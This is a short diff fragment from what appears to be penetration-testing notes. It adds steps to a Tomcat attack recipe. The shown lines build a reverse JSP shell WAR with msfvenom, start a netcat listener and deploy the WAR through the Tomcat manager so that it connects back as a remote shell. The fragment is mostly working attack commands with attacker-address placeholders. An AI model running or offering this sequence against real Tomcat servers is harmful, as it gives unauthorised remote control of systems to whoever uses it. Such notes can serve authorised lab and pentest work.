@@ -10,4 +10,6 @@
 	using metasploit generate a reverse JSP shell:
 	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell_<userid>.war
 	Listen with netcat: nc -lvp <port>
+        Deploy the WAR file to Tomcat
+        Once deployed, click on your newly created app in the manager and you should get a reverse shell in netcat
 
